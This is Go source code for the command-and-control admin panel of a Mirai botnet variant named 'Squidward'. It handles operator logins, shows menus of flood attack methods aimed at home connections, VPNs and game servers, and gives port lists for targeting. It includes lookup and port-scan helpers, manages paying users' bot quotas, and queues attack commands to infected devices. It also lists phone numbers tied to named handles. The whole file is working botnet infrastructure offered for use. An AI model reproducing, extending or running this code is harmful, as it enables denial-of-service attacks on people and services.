package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
    "net/http"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;36m╔════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m║ \033[0;49;9mWelcome to the \033[0;49;9mSquidward Mirai Variant\033[0;49;9m!\033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m║          \033[0;49;9mRespect Others                \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m║        \033[0;49;9mDo \033[0;49;9mNOT \033[0;49;9mShare Logins             \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m╚════════════════════════════════════════╝\r\n\r\n"))
    this.conn.Write([]byte("\033[0;36mUsername\033[2;49;39m: \033[0;49;9m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(8 * time.Second))
    this.conn.Write([]byte("\033[0;49;36mPassword\033[0;36m: \033[0;49;9m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

     var loggedIn bool
     var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\033[0;31mWrong login... Hitting and logging your IP now..."))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0;49;36m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]; %d Bots | Identify As: (%s)\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[0;49;36m      Welcome \033[0;49;9m" + username + "\033[36m to Squidward Mirai!          \r\n"))
    this.conn.Write([]byte("\033[36m███████╗ ██████╗ ██╗   ██╗██╗██████╗ ██╗    ██╗ █████╗ ██████╗ ██████╗ \r\n"))
    this.conn.Write([]byte("\033[36m██╔════╝██╔═══██╗██║   ██║██║██╔══██╗██║    ██║██╔══██╗██╔══██╗██╔══██╗\r\n"))
    this.conn.Write([]byte("\033[36m███████╗██║   ██║██║   ██║██║██║  ██║██║ █╗ ██║███████║██████╔╝██║  ██║\r\n"))
    this.conn.Write([]byte("\033[36m╚════██║██║▄▄ ██║██║   ██║██║██║  ██║██║███╗██║██╔══██║██╔══██╗██║  ██║\r\n"))
    this.conn.Write([]byte("\033[36m███████║╚██████╔╝╚██████╔╝██║██████╔╝╚███╔███╔╝██║  ██║██║  ██║██████╔╝\r\n"))
    this.conn.Write([]byte("\033[36m╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚═╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ \r\n"))
    this.conn.Write([]byte("\033[0;49;9m                  https://discord.gg/aYUfKya          \r\n"))
    this.conn.Write([]byte("\033[0;49;9m   https://www.youtube.com/channel/UCVzNQu9CKFcQM5wfGvtIZOQ\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0;49;9mSquidward\033[0;36m@\033[0;49;36m\033[0;36m: \033[0;49;9m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "CLS" || cmd == "cls" {
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[0;49;36m      Welcome \033[0;49;9m" + username + "\033[36m to Squidward Mirai!          \r\n"))
    this.conn.Write([]byte("\033[36m███████╗ ██████╗ ██╗   ██╗██╗██████╗ ██╗    ██╗ █████╗ ██████╗ ██████╗ \r\n"))
    this.conn.Write([]byte("\033[36m██╔════╝██╔═══██╗██║   ██║██║██╔══██╗██║    ██║██╔══██╗██╔══██╗██╔══██╗\r\n"))
    this.conn.Write([]byte("\033[36m███████╗██║   ██║██║   ██║██║██║  ██║██║ █╗ ██║███████║██████╔╝██║  ██║\r\n"))
    this.conn.Write([]byte("\033[36m╚════██║██║▄▄ ██║██║   ██║██║██║  ██║██║███╗██║██╔══██║██╔══██╗██║  ██║\r\n"))
    this.conn.Write([]byte("\033[36m███████║╚██████╔╝╚██████╔╝██║██████╔╝╚███╔███╔╝██║  ██║██║  ██║██████╔╝\r\n"))
    this.conn.Write([]byte("\033[36m╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚═╝╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ \r\n"))
    this.conn.Write([]byte("\033[0;49;9m                  https://discord.gg/aYUfKya          \r\n"))
    this.conn.Write([]byte("\033[0;49;9m   https://www.youtube.com/channel/UCVzNQu9CKFcQM5wfGvtIZOQ\r\n"))
    this.conn.Write([]byte("\033[0;49;36m\r\n"))
            continue
        }
        if err != nil || cmd == "HOME" || cmd == "home" || cmd == "hm" {
    this.conn.Write([]byte("\033[0;36m ╔═══════════════════════════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m           Squidward HOME METHODS             \033[0;49;36m║ \033[0;49;9mMethod Names \033[0;36m ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║═══════════════════════════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mxmas      [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]           \033[0;36m║ \033[0;49;9mXMAS          \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mudp       [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]           \033[0;36m║ \033[0;49;9mUDP           \033[0;36m║\r\n")) 
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mhome      [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]           \033[0;36m║ \033[0;49;9mHOME          \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mudpplain  [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]           \033[0;36m║ \033[0;49;9mUDPPLAIN      \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mCLEAR - clear - CLS - cls                    \033[0;36m║ \033[0;49;9mCLEAR SCREEN  \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║═══════════════════════════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m            Squidward HOME METHODS            \033[0;36m║  \033[0;49;9mMethod Names\033[0;36m ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚═══════════════════════════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }
        if err != nil || cmd == "ports" || cmd == "PORT" || cmd == "port" || cmd == "PORTS" {
    this.conn.Write([]byte("\033[0;36m ╔════════════════════════════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9m            Squidward PORTS MENU             \033[0;36m║   \033[0;49;9mTYPE OF IPS  \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║════════════════════════════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║   \033[0;49;9m22 - 53 - 80 - 3074 - 8080 - 9307           \033[0;36m║  \033[0;49;9mAny Home      \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║   \033[0;49;9m53 - 80 - 389 - 443 - 3389                  \033[0;36m║  \033[0;49;9mAny Hotspot   \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║   \033[0;49;9m53 - 389 - 443 - 547 - 992 - 995 - 1194     \033[0;36m║  \033[0;49;9mAny Vpn       \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║   \033[0;49;9m90xx - 3xxxx                                \033[0;36m║  \033[0;49;9mAny FN or R6  \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║════════════════════════════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m             Squidward PORTS MENU             \033[0;36m║  \033[0;49;9mTYPE OF IPS   \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚════════════════════════════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }
        if err != nil || cmd == "rules" || cmd == "RULES" {
    this.conn.Write([]byte("\033[0;36m ╔══════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m      Squidward MIRAI NET RULES      \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║══════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mNO SPAMMING ATTACKS!                 \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mNO SHARING NET LOGIN INFO!           \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mNO SHARING NET IP ADDRESS!           \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mNO SPAMMING THE SAME IP!             \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚══════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }
        if cmd == "?" || cmd == "help" || cmd == "HELP" {
    this.conn.Write([]byte("\033[0;36m ╔══════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9m     Squidward MIRAI HELP MENU      \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║══════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9mATTACK or attack   - Attacks        \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9mPORTS or ports     - Ports          \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9mADMIN or admin     - Admin Menu     \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9mCREDITS or credits - Credits        \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9mNUMBERS or numbers - Numbers        \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9mTOOLS or tools     - Tools          \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║  \033[0;49;9mRULES or rules     - Rules          \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚══════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }
        if err != nil || cmd == "CREDITS" || cmd == "credits" {
    this.conn.Write([]byte("\033[0;36m ╔════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m        Squidward MIRAI CREDITS        \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9meLordzFarrets#9943 | @kickmyproxy      \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }
        if userInfo.admin == 1 && cmd == "ADMIN" || cmd == "admin" {
    this.conn.Write([]byte("\033[0;36m ╔══════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m     Squidward MIRAI ADMIN MENU      \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║══════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mADDUSER      \033[0;36m- Add Basic Client      ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mREMOVEUSER   \033[0;36m\033[0;36m- Remove User           ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mBOTS         \033[0;36m- Shows Bot Count       ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚══════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }
        if err != nil || cmd == "NUMBERS" || cmd == "numbers" {
    this.conn.Write([]byte("\033[0;36m ╔═════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m     Squidward MIRAI NUMBERS MENU   \033[0;36m    ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║═════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m@im.rooted's number: +1-714-267-3298 \033[0;36m    ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m@devil.siri's number: +1-866-720-5721\033[0;36m    ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m@ungv's number: +1-800-225-5324\033[0;36m          ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m@Fseo's number: +44-0370-496-7622\033[0;36m        ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚═════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }            
        if err != nil || cmd == "attack" || cmd == "ATTACK" || cmd == "methods" || cmd == "attacks" || cmd == "ATTACKS" {
    this.conn.Write([]byte("\033[0;49;9m           Attack Hub             \r\n"))
    this.conn.Write([]byte("\033[0;36m ╔═══════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m  HOME    - HOME HUB       \033[0;36m║  \r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m  GAMING  - GAMING HUB     \033[0;36m║  \r\n"))
    this.conn.Write([]byte("\033[0;36m ╚═══════════════════════════╝\r\n"))
             continue
        }
        if err != nil || cmd == "GAMING" || cmd == "gaming" || cmd == "gm" {
    this.conn.Write([]byte("\033[0;36m ╔═══════════════════════════════════════════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m           Squidward GAMING METHODS           \033[0;49;36m║ \033[0;49;9mMethod Names \033[0;36m ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║═══════════════════════════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m2k        [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]            \033[0;36m║ \033[0;49;9m2K            \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mranked    [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]            \033[0;36m║ \033[0;49;9mRANKED        \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mr6        [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]            \033[0;36m║ \033[0;49;9mR6            \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mfortnite  [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]            \033[0;36m║ \033[0;49;9mFORTNITE      \033[0;36m║\r\n"))
	this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mcrash     [\033[0;36mIP\033[0;49;9m] [\033[0;36mTIME\033[0;49;9m] dport=[\033[0;36mPORT\033[0;49;9m]            \033[0;36m║ \033[0;49;9mGAME CRASH    \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9mCLEAR - clear - CLS - cls                     \033[0;36m║ \033[0;49;9mCLEAR SCREEN  \033[0;36m║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║═══════════════════════════════════════════════════════════════║\r\n"))
    this.conn.Write([]byte("\033[0;36m ║ \033[0;49;9m            Squidward GAMING METHODS          \033[0;36m║  \033[0;49;9mMethod Names\033[0;36m ║\r\n"))
    this.conn.Write([]byte("\033[0;36m ╚═══════════════════════════════════════════════════════════════╝\r\n"))
    this.conn.Write([]byte("\033[0;36m\r\n"))
            continue
        }
        if err != nil || cmd == "tools" || cmd == "TOOLS" {
    this.conn.Write([]byte("\033[0;49;9m              Tool Hub             \r\n"))
    this.conn.Write([]byte("\033[0;36m ╔═══════════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m  iplookup - Shows IP info \033[0;36m║  \r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m  portscan - Port Scanner  \033[0;36m║  \r\n"))
    this.conn.Write([]byte("\033[0;36m ║\033[0;49;9m  asnlookup - ASN Lookup   \033[0;36m║  \r\n"))
    this.conn.Write([]byte("\033[0;36m ╚═══════════════════════════╝\r\n"))
             continue
        }     
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }

             if err != nil || cmd == "IPLOOKUP" || cmd == "iplookup" {                  
            this.conn.Write([]byte("\x1b[0;49;9mWebsite (Without www. / IPV4 )\x1b[0;36m: \x1b[0;49;9m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
           url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[\033[0;31mError IP address or host name only\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[\033[0;31mError IP address or host name only\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[0;49;9mResponse\x1b[0;36m: \r\n\x1b[0;49;9m" + locformatted + "\r\n"))
                                    continue
        }
             if err != nil || cmd == "portscan" || cmd == "PORTSCAN" {                  
            this.conn.Write([]byte("\x1b[0;49;9m IPV4 )\x1b[0;36m: \x1b[0;49;9m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
           url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[\033[0;31mError IP address or host name only\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[\033[0;31mError IP address or host name only\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[0;49;9mResponse\x1b[0;36m: \r\n\x1b[0;49;9m" + locformatted + "\r\n"))
                                    continue
        }

            if err != nil || cmd == "asnlookup" || cmd == "asn" {
            this.conn.Write([]byte("\x1b[0;49;9mIP Address\x1b[0;36m: \x1b[0;49;9m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[0;49;9mResponse\x1b[0;36m: \r\n\x1b[0;49;9m" + locformatted + "\r\n"))
        }

        if cmd == "" {
            continue
        }
        
            if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\033[0;49;36mUsername: \033[0;36m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte("\033[0;49;36mAre You Sure You Want To Remove \033[0;49;36m" + rm_un + "?\033[0;49;36m(\033[01;36mY\033[0;49;36m/\033[01;36mn\033[0;49;36m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "Y" {
                continue
            }
            if !database.DeleteUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[0;31mUnable to remove user\r\n")))
            } else {
                this.conn.Write([]byte("\033[0;49;36mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots
        
        if userInfo.admin == 1 && cmd == "ADDUSER" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "BOTS" || cmd == "bots" {
            botCount = clientList.Count()
                m := clientList.Distribution()
                this.conn.Write([]byte(fmt.Sprintf("\033[0;36m ╔══════════════════════════════════════════════════╗\r\n\033[0;49;36m")))
                this.conn.Write([]byte(fmt.Sprintf("\033[0;36m ║ \033[0;49;36m            Squidward BOT COUNT MENU\033[0;36m             ║\r\n\033[0;49;36m")))
                this.conn.Write([]byte(fmt.Sprintf("\033[0;36m ╚══════════════════════════════════════════════════╝\r\n\033[0;49;36m")))
                for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;36m              %s:   \033[0;36m%d\r\n", k, v)))
                }
                this.conn.Write([]byte(fmt.Sprintf("\033[0;49;36m              Total bots on Squidward: \033[0;36m%d\r\n", botCount)))
                this.conn.Write([]byte(fmt.Sprintf("\033[0;36m ════════════════════════════════════════════════════\r\n\033[0;49;36m")))
                this.conn.Write([]byte("\033[0;36m\r\n"))
                continue
            }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;31mFailed To Phrase Botcount\"%s\"\033[0;49;36m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;31mBot count to send is bigger then allowed bot maximum\033[0;49;36m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[0;49;36m%s\033[0;49;36m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[0;49;36m%s\033[0;49;36m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;49;36m%s\033[0;49;36m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
